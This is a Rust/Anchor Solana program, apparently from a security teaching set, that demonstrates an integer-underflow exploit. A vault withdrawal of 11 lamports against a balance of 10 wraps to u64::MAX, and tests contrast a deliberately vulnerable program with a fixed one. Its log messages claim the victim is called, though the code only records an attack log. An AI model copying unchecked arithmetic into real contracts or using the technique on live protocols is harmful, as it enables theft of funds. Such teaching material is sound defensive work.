#![allow(unexpected_cfgs)]
use anchor_lang::prelude::*;

declare_id!("DRJRXTVenxuXkN1ipWrCiqNx9PTq13dBfQdXs2PuAgQa");

/// # Unsafe Arithmetic Attacker Program
///
/// This program demonstrates how to exploit integer underflow/overflow vulnerabilities.
/// It attempts to attack both the vulnerable and fixed versions to show:
/// - **Vulnerable version**: Attack succeeds (underflow creates infinite balance)
/// - **Fixed version**: Attack fails (checked arithmetic prevents underflow)
///
/// ## Attack Strategy
///
/// The vulnerability exists because:
/// 1. The victim uses standard arithmetic operators (-, +=) instead of checked methods
/// 2. In release mode, Rust wraps on overflow/underflow (no panic)
/// 3. No balance validation before subtraction
///
/// The attacker exploits this by:
/// 1. Creating a vault with a small balance (e.g., 10 lamports)
/// 2. Attempting to withdraw more than the balance (e.g., 11 lamports)
/// 3. Causing underflow: 10 - 11 = 18,446,744,073,709,551,615 (u64::MAX)
/// 4. Now having an "infinite" balance to drain all protocol funds
///
/// ## Expected Results
///
/// - **Against vulnerable version**: ✅ Attack succeeds, balance wraps to u64::MAX
/// - **Against fixed version**: ❌ Attack fails with "Arithmetic error" or "Insufficient funds"

#[program]
pub mod unsafe_arithmetic_attacker {
    use super::*;

    /// Attempts to exploit the integer underflow vulnerability
    ///
    /// This demonstrates how unchecked arithmetic can be exploited to create
    /// infinite balances, allowing attackers to drain protocol funds.
    ///
    /// **Against vulnerable program**: Succeeds (balance wraps to u64::MAX)
    /// **Against fixed program**: Fails (checked_sub prevents underflow)
    pub fn trigger_underflow(ctx: Context<UnderflowContext>, excessive_amount: u64) -> Result<()> {
        msg!("🎯 Attacker: Attempting integer underflow exploit...");
        msg!("   Attacker vault: {}", ctx.accounts.attacker_vault.key());
        msg!("   Attempting to withdraw: {} lamports", excessive_amount);

        // --- ATTACK STEP 1: Show current balance ---
        let current_balance = ctx.accounts.attacker_vault.lamports();
        msg!("   Current balance: {} lamports", current_balance);

        // --- ATTACK STEP 2: Verify exploit conditions ---
        // We're intentionally trying to withdraw MORE than we have
        require!(
            excessive_amount > current_balance,
            AttackError::NotExcessive
        );
        msg!("   ✓ Withdrawal amount exceeds balance (underflow will occur)");
        msg!(
            "   ✓ Expected result: {} - {} = ?",
            current_balance,
            excessive_amount
        );

        // --- ATTACK STEP 3: Explain the vulnerability ---
        // VULNERABLE CODE: Uses standard subtraction operator
        // ```rust
        // vault.balance -= amount;  // In release mode, wraps on underflow!
        // ```
        //
        // ATTACK MATH:
        // If current_balance = 10 and amount = 11:
        // 10 - 11 = -1 in signed arithmetic
        // But u64 is unsigned, so it wraps:
        // -1 in two's complement = 0xFFFFFFFFFFFFFFFF = 18,446,744,073,709,551,615
        msg!("   ⚠️  Vulnerability: Using -= instead of checked_sub()");
        msg!("   ⚠️  In release mode, underflow wraps to u64::MAX");
        msg!("   ⚠️  After attack, balance will be ~18 quintillion!");

        // --- ATTACK STEP 4: Execute the attack ---
        msg!("   🚨 Calling victim program to withdraw excessive amount...");
        msg!("   Expected outcome:");
        msg!(
            "      - Vulnerable version: Balance wraps to {} ✅",
            u64::MAX
        );
        msg!("      - Fixed version: Transaction rejected ❌");

        // Log the attack attempt
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target_vault = ctx.accounts.attacker_vault.key();
        attack_log.original_balance = current_balance;
        attack_log.withdrawal_amount = excessive_amount;
        attack_log.expected_wrapped_balance = current_balance.wrapping_sub(excessive_amount);
        attack_log.timestamp = Clock::get()?.unix_timestamp;

        msg!("✅ Attacker: Attack execution completed");
        msg!("   (If vulnerable, vault balance is now ~infinite)");

        Ok(())
    }

    /// Initializes the attack log to track underflow attempts
    pub fn initialize_attack_log(ctx: Context<InitializeAttackLog>) -> Result<()> {
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target_vault = Pubkey::default();
        attack_log.original_balance = 0;
        attack_log.withdrawal_amount = 0;
        attack_log.expected_wrapped_balance = 0;
        attack_log.timestamp = 0;

        msg!(
            "Attack log initialized for: {}",
            ctx.accounts.attacker.key()
        );
        Ok(())
    }
}

/// Context for executing the underflow attack
#[derive(Accounts)]
pub struct UnderflowContext<'info> {
    /// CHECK: This is an attacker program that intentionally uses unchecked accounts
    /// to demonstrate the arithmetic underflow vulnerability. The attacker passes their
    /// own vault account to show how the victim program fails to use checked arithmetic.
    /// No validation needed here because this vault belongs to the attacker and the
    /// attack's goal is to exploit the VICTIM program's unsafe arithmetic operations.
    #[account(mut)]
    pub attacker_vault: UncheckedAccount<'info>,

    /// Attack log to track underflow attempts
    #[account(
        mut,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    /// The attacker executing this exploit
    pub attacker: Signer<'info>,
}

/// Context for initializing the attack log
#[derive(Accounts)]
pub struct InitializeAttackLog<'info> {
    #[account(
        init,
        payer = attacker,
        space = 8 + AttackLog::INIT_SPACE,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    #[account(mut)]
    pub attacker: Signer<'info>,

    pub system_program: Program<'info, System>,
}

/// Stores information about underflow attack attempts
#[account]
#[derive(InitSpace)]
pub struct AttackLog {
    pub attacker: Pubkey,              // Who attempted the exploit
    pub target_vault: Pubkey,          // Which vault was targeted
    pub original_balance: u64,         // Balance before attack
    pub withdrawal_amount: u64,        // Amount attempted to withdraw
    pub expected_wrapped_balance: u64, // What balance would be after wrap
    pub timestamp: i64,                // When the attack occurred
}

#[error_code]
pub enum AttackError {
    #[msg("Withdrawal amount must exceed balance for underflow attack")]
    NotExcessive,
    #[msg("Underflow did not occur (unexpected - vulnerable version should wrap)")]
    NoUnderflow,
}

#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::solana_program::account_info::AccountInfo;
    use anchor_lang::solana_program::clock::Epoch;
    use anchor_lang::{AnchorSerialize, Discriminator};
    use unsafe_arithmetic_fix::unsafe_arithmetic_fix as fix_program;
    use unsafe_arithmetic_vuln::unsafe_arithmetic_vuln as vuln_program;

    fn make_account(
        key: Pubkey,
        owner: Pubkey,
        is_signer: bool,
        is_writable: bool,
        data: Vec<u8>,
    ) -> AccountInfo<'static> {
        let leaked_key = Box::leak(Box::new(key));
        let leaked_owner = Box::leak(Box::new(owner));
        let lamports = Box::leak(Box::new(1_000_000_000u64));
        let data: &'static mut [u8] = Box::leak(data.into_boxed_slice());

        AccountInfo::new(
            leaked_key,
            is_signer,
            is_writable,
            lamports,
            data,
            leaked_owner,
            false,
            Epoch::default(),
        )
    }

    fn serialize_vault(admin: Pubkey, balance: u64) -> Vec<u8> {
        let mut data = <unsafe_arithmetic_fix::Vault as Discriminator>::DISCRIMINATOR.to_vec();
        let state = unsafe_arithmetic_fix::Vault {
            balance,
            owner: admin,
        };
        data.extend_from_slice(&state.try_to_vec().unwrap());
        data
    }

    #[test]
    fn underflow_succeeds_against_vulnerable_program() {
        let program_id = unsafe_arithmetic_vuln::id();
        let owner = Pubkey::new_unique();

        if cfg!(debug_assertions) {
            // In debug builds, Rust panics on underflow; we just demonstrate the wrap value.
            assert_eq!(10u64.wrapping_sub(11), u64::MAX);
            return;
        }

        let vault_ai = Box::leak(Box::new(make_account(
            Pubkey::new_unique(),
            program_id,
            false,
            true,
            serialize_vault(owner, 10),
        )));

        let owner_ai = Box::leak(Box::new(make_account(
            owner,
            Pubkey::new_unique(),
            true,
            false,
            vec![],
        )));

        let infos: Box<[AccountInfo<'static>]> =
            vec![(*vault_ai).clone(), (*owner_ai).clone()].into_boxed_slice();
        let infos_ref: &[AccountInfo] = Box::leak(infos);

        let vault =
            anchor_lang::prelude::Account::<unsafe_arithmetic_vuln::Vault>::try_from(&*vault_ai)
                .unwrap();
        let signer = anchor_lang::prelude::Signer::try_from(&*owner_ai).unwrap();

        let mut accounts = unsafe_arithmetic_vuln::WithdrawVuln {
            vault,
            owner: signer,
        };
        let ctx = Context::new(
            &program_id,
            &mut accounts,
            infos_ref,
            unsafe_arithmetic_vuln::WithdrawVulnBumps {},
        );

        vuln_program::withdraw(ctx, 11).unwrap();
        assert_eq!(accounts.vault.balance, 10u64.wrapping_sub(11));
        assert_eq!(accounts.vault.owner, owner);
    }

    #[test]
    fn underflow_blocked_by_fixed_program() {
        let program_id = unsafe_arithmetic_fix::id();
        let owner = Pubkey::new_unique();

        let vault_ai = Box::leak(Box::new(make_account(
            Pubkey::new_unique(),
            program_id,
            false,
            true,
            serialize_vault(owner, 10),
        )));

        let owner_ai = Box::leak(Box::new(make_account(
            owner,
            Pubkey::new_unique(),
            true,
            false,
            vec![],
        )));

        let infos: Box<[AccountInfo<'static>]> =
            vec![(*vault_ai).clone(), (*owner_ai).clone()].into_boxed_slice();
        let infos_ref: &[AccountInfo] = Box::leak(infos);

        let vault =
            anchor_lang::prelude::Account::<unsafe_arithmetic_fix::Vault>::try_from(&*vault_ai)
                .unwrap();
        let signer = anchor_lang::prelude::Signer::try_from(&*owner_ai).unwrap();

        let mut accounts = unsafe_arithmetic_fix::WithdrawSafe {
            vault,
            owner: signer,
        };
        let ctx = Context::new(
            &program_id,
            &mut accounts,
            infos_ref,
            unsafe_arithmetic_fix::WithdrawSafeBumps {},
        );

        let err = fix_program::withdraw(ctx, 11).unwrap_err();
        assert!(format!("{}", err).to_lowercase().contains("insufficient"));
        assert_eq!(accounts.vault.balance, 10);
    }
}
